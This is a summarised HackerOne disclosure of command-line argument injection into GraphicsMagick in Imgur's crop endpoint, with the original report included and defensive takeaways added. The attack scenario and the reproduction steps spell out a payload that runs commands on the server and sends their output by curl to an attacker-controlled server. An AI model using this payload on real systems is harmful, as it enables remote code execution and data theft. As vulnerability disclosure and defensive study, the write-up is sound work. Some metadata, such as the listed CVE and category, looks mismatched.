# RCE by Command Line Argument Injection to `gm convert` in `/edit/process?a=crop`

## Metadata
- **Source:** HackerOne
- **Report:** 212696 | https://hackerone.com/reports/212696
- **Submitted:** 2017-03-12
- **Reporter:** neex
- **Program:** Imgur
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Command Injection, Argument Injection, Unsafe Command Construction
- **CVEs:** CVE-2016-10033
- **Category:** memory-binary

## Summary
The `y` parameter in the `/edit/process` endpoint with `a=crop` is vulnerable to command-line argument injection when passed to GraphicsMagick's `gm convert` utility. An attacker can inject arbitrary arguments like `-write |<command>` to achieve remote code execution, as GraphicsMagick executes commands when filenames begin with a pipe character.

## Attack scenario
1. Attacker logs into their Imgur account and initiates the image crop editing workflow
2. Attacker intercepts the HTTP request to `/edit/process?a=crop` using a proxy tool (Burp Suite)
3. Attacker modifies the `y` parameter from a numeric value (e.g., `0`) to include a GraphicsMagick argument injection payload (e.g., `0 -write |ps${IFS}aux|curl${IFS}http://attacker-server${IFS}-d${IFS}@-`)
4. Attacker sends the modified request, which constructs a shell command with unescaped spaces allowing argument injection
5. The server passes the injected payload to `gm convert`, which interprets `-write` and the pipe-prefixed filename as a command execution directive
6. The injected command executes on the server with the privileges of the image processing service, exfiltrating data or establishing reverse shell

## Root cause
User input from the `y` GET parameter is concatenated directly into a shell command without proper escaping. While special characters like `|`, `$` are escaped, the space character is not, allowing an attacker to inject additional command-line arguments. The underlying issue is likely the use of PHP's `escapeshellcmd()` function instead of `escapeshellarg()`, or custom incomplete input filtering. GraphicsMagick's `-write` option compounds this by supporting pipe-prefixed filenames that execute shell commands.

## Attacker mindset
The attacker systematically tested special characters and discovered spaces were not filtered, enabling argument injection. Through experimentation with `-rotate 90` they identified the tool as GraphicsMagick, then researched its documentation to find the dangerous `-write` feature. This demonstrates methodical reconnaissance and leveraging tool-specific features for exploitation.

## Defensive takeaways
- Use `escapeshellarg()` to properly escape individual arguments instead of `escapeshellcmd()` which is insufficient for argument injection prevention
- Prefer using parameterized/array-based command execution (e.g., `proc_open()` with array arguments) instead of shell string concatenation
- Implement strict input validation on numeric parameters (e.g., validate `y` is an integer within expected bounds)
- Apply allowlist-based validation where feasible rather than blacklist filtering
- Conduct codebase audit for all instances of `escapeshellcmd()` and replace with safer alternatives
- Run image processing tools with minimal privileges and in sandboxed environments
- Use security headers and request signing to prevent parameter tampering

## Variant hunting
Search for similar patterns in other image processing endpoints: resize, rotate, filter operations. Check any other user-supplied numeric parameters passed to external tools (crop x/w coordinates, rotation angles, quality settings). Audit other services using ImageMagick/GraphicsMagick for argument injection. Test other GraphicsMagick dangerous options like `-delete`, `-alpha`, or `-fx` that might enable code execution.

## MITRE ATT&CK
- T1190
- T1059
- T1083

## Notes
Report demonstrates excellent vulnerability research methodology. Researcher used comparative testing (`-rotate 90`), tool identification, and documentation review to discover exploitation method. The use of `${IFS}` to bypass space filtering shows sophisticated payload construction. Report timestamp suggests this was a real vulnerability affecting Imgur's production infrastructure.

## Full report
<details><summary>Expand</summary>

### Summary

The `y` parameter of `/edit/process` endpoint (with `a=crop`) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably `gm convert`). Due to GraphicsMagick's hacker-friendly processing of `|`-starting filenames supplied to `-write` option, it leads to command execution.

### Reproduction steps

0. Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.
1. Login into your imgur account and upload an image.
2. Move your mouse over the image, click on the tiny button with pencil on it, then click "Edit".
3. Select a random rectangle on the image, then click "Apply".
4. In the burp suite, you will see a request to an URL like this:  `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510`

     Change the `y` parameter of the request so it becomes `0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-`. 

     The full URL after the change must look like `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303`, note that you have to change `<your-server>` to a webserver under your control).

5. Fire a request to the modified URL. The command (`ps aux|curl http://<your-server> -d @-`) will be executed somewhere inside imgur, and you will get a HTTP request to `<your-server>` with the result of `ps aux` in the POST body.  You can replace `ps aux` with another command (but you have to write `${IFS}` instead of spaces).

### Detailed description

I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of `y` GET parameter) goes into a shell command. While all special characters (like `|`, `$` and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is `escapeshellcmd` PHP function, but that can also be some kind of custom input filtering/processing.

The rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by "Crop/Resize" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended ` -rotate 90` to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably `gm convert` utility). I read the documentation and found that `-write` argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.

### Mitigation

Probably either some kind of custom processing or `escapeshellcmd` function is used to construct the command line. In both cases, replace it with applying `escapeshellarg` to individual arguments. In the second case, you probably want to run `grep -R escapeshellcmd <path to the source code>` to find more vulns :-)


</details>

---
*Analysed by Claude on 2026-05-11*
